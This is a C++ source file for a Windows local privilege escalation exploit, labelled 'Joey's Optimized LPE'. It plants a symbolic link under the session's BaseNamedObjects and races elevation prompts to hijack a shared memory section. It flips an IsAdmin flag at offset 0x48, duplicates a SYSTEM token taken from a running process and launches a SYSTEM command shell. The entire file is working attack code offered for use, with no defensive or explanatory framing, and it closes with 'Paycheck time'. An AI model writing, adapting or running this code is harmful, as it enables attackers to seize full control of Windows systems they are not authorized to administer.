// If building in a VS project that was created with the wizard, go to:
// Project -> Properties -> C/C++ -> Precompiled Headers -> set to "Not Using Precompiled Headers"
// Otherwise the wizard-generated pch.h include will break compilation.

#define _CRT_SECURE_NO_WARNINGS  // suppress swprintf/swprintf_s deprecation in MSVC

#include <Windows.h>
#include <winternl.h>
#include <stdio.h>
#include <tlhelp32.h>

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "advapi32.lib")  // token APIs, AdjustTokenPrivileges, CreateProcessWithTokenW
#pragma comment(lib, "shell32.lib")   // ShellExecuteEx

// Static CRT linkage — prevents "missing MSVCP140.dll" on machines without
// the VC++ redistributable installed.
#pragma comment(linker, "/NODEFAULTLIB:msvcrt.lib")
#pragma comment(linker, "/NODEFAULTLIB:msvcrtd.lib")
#ifdef _DEBUG
#pragma comment(lib, "libcmtd.lib")
#else
#pragma comment(lib, "libcmt.lib")
#endif

typedef NTSTATUS (NTAPI* _NtCreateSymbolicLinkObject)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PUNICODE_STRING);
typedef NTSTATUS (NTAPI* _NtOpenSection)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES);

volatile BOOL bKeepRunning = TRUE;

BOOL EnablePrivilege(LPCWSTR privName) {
    HANDLE hToken = NULL;
    TOKEN_PRIVILEGES tp = {};
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return FALSE;
    BOOL ok = FALSE;
    if (LookupPrivilegeValueW(NULL, privName, &tp.Privileges[0].Luid)) {
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        AdjustTokenPrivileges(hToken, FALSE, &tp, 0, NULL, NULL);
        // Save before CloseHandle — CloseHandle can clobber GetLastError.
        ok = (GetLastError() == ERROR_SUCCESS);
    }
    CloseHandle(hToken);
    return ok;
}

HANDLE StealSystemToken() {
    EnablePrivilege(SE_DEBUG_NAME);
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return NULL;

    PROCESSENTRY32W pe = { sizeof(pe) };
    HANDLE hSysToken = NULL;

    if (Process32FirstW(hSnap, &pe)) {
        do {
            HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe.th32ProcessID);
            if (!hProc) continue;

            HANDLE hTok = NULL;
            // TOKEN_ASSIGN_PRIMARY required for CreateProcessWithTokenW.
            // Do not target lsass.exe specifically — it is PPL on modern Windows
            // and OpenProcessToken will fail even with SeDebugPrivilege.
            if (OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ASSIGN_PRIMARY, &hTok)) {
                BYTE buf[4096] = {};
                DWORD len = 0;
                if (GetTokenInformation(hTok, TokenUser, buf, sizeof(buf), &len)) {
                    PTOKEN_USER ptu = (PTOKEN_USER)buf;
                    if (IsWellKnownSid(ptu->User.Sid, WinLocalSystemSid)) {
                        if (DuplicateTokenEx(hTok, TOKEN_ALL_ACCESS, NULL,
                                SecurityImpersonation, TokenPrimary, &hSysToken))
                            printf("[+] Stolen SYSTEM token from PID %d (%ws)\n",
                                pe.th32ProcessID, pe.szExeFile);
                    }
                }
                CloseHandle(hTok);
            }
            CloseHandle(hProc);
        } while (!hSysToken && Process32NextW(hSnap, &pe));
    }
    CloseHandle(hSnap);
    return hSysToken;
}

void SpawnSystemShell(HANDLE hSysToken) {
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = {};
    si.lpDesktop = (wchar_t*)L"WinSta0\\Default";
    wchar_t cmd[] = L"C:\\Windows\\System32\\cmd.exe";

    if (CreateProcessWithTokenW(hSysToken, LOGON_WITH_PROFILE, NULL, cmd, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
        printf("[+] SYSTEM Shell Executed. PID: %d\n", pi.dwProcessId);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    } else {
        printf("[-] Shell spawn failed. Error: %d\n", GetLastError());
        printf("    (Needs SeImpersonatePrivilege — run from elevated or service context)\n");
    }
}

DWORD WINAPI TriggerRace(LPVOID lpParam) {
    SHELLEXECUTEINFO shi = { sizeof(shi) };
    shi.fMask = SEE_MASK_NOZONECHECKS | SEE_MASK_ASYNCOK;
    shi.lpVerb = L"runas";
    shi.lpFile = L"C:\\Windows\\System32\\conhost.exe";
    shi.nShow = SW_HIDE;

    while (bKeepRunning) {
        ShellExecuteEx(&shi);
        for (int i = 0; i < 50; i++) YieldProcessor();
    }
    return 0;
}

int wmain() {
    printf("[*] Joey's Optimized LPE - Starting...\n");

    DWORD sessionId = 0;
    ProcessIdToSessionId(GetCurrentProcessId(), &sessionId);

    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    auto NtCreateSymbolicLinkObject = (_NtCreateSymbolicLinkObject)GetProcAddress(ntdll, "NtCreateSymbolicLinkObject");
    auto NtOpenSection = (_NtOpenSection)GetProcAddress(ntdll, "NtOpenSection");

    UNICODE_STRING linkName, targetName;
    OBJECT_ATTRIBUTES linkAttr, targetAttr;

    wchar_t linkPath[256];
    swprintf(linkPath, 256, L"\\Sessions\\%lu\\BaseNamedObjects\\TargetServiceConfig", sessionId);

    RtlInitUnicodeString(&linkName, linkPath);
    RtlInitUnicodeString(&targetName, L"\\BaseNamedObjects\\JoeyExploitSection");
    InitializeObjectAttributes(&linkAttr, &linkName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    HANDLE hLink = NULL;
    if (NtCreateSymbolicLinkObject(&hLink, SYMBOLIC_LINK_ALL_ACCESS, &linkAttr, &targetName) != 0) {
        printf("[-] Failed to plant symlink. Check permissions.\n");
        return 1;
    }

    HANDLE hThread = CreateThread(NULL, 0, TriggerRace, NULL, 0, NULL);
    if (hThread) SetThreadPriority(hThread, THREAD_PRIORITY_TIME_CRITICAL);

    InitializeObjectAttributes(&targetAttr, &targetName, OBJ_CASE_INSENSITIVE, NULL, NULL);
    HANDLE hMapping = NULL;

    printf("[*] Racing for section handle...\n");
    while (TRUE) {
        if (NtOpenSection(&hMapping, SECTION_ALL_ACCESS, &targetAttr) == 0) {
            void* pView = MapViewOfFile(hMapping, FILE_MAP_WRITE, 0, 0, 0);
            if (pView) {
                // WinDbg-confirmed offset 0x48 for IsAdmin flag.
                // Validate before writing — wrong offset on a mismatched build
                // corrupts unrelated struct fields and likely BSoDs.
                DWORD current = *((DWORD*)((unsigned char*)pView + 0x48));
                if (current == 0) {
                    *((DWORD*)((unsigned char*)pView + 0x48)) = 1;
                    printf("[+] View poisoned. Flag set at 0x48.\n");
                } else if (current == 1) {
                    printf("[*] Flag at 0x48 already set.\n");
                } else {
                    printf("[!] Unexpected value 0x%08X at 0x48 — wrong build? Skipping write.\n", current);
                }
                UnmapViewOfFile(pView);
            }

            bKeepRunning = FALSE;
            HANDLE hSysToken = StealSystemToken();
            if (hSysToken) {
                SpawnSystemShell(hSysToken);
                CloseHandle(hSysToken);
            } else {
                printf("[-] Could not obtain a SYSTEM token.\n");
            }
            // Flag is already written — break regardless of token theft outcome.
            break;
        }
    }

    // Retrigger — push the service back into the flag-reading code path.
    SHELLEXECUTEINFO retrigger = { sizeof(retrigger) };
    retrigger.fMask = SEE_MASK_NOZONECHECKS;
    retrigger.lpVerb = L"runas";
    retrigger.lpFile = L"C:\\Windows\\System32\\conhost.exe";
    retrigger.nShow = SW_HIDE;
    ShellExecuteEx(&retrigger);

    if (hThread) { WaitForSingleObject(hThread, 1000); CloseHandle(hThread); }
    if (hLink)    CloseHandle(hLink);
    if (hMapping) CloseHandle(hMapping);

    printf("[*] Done. Paycheck time.\n");
    return 0;
}
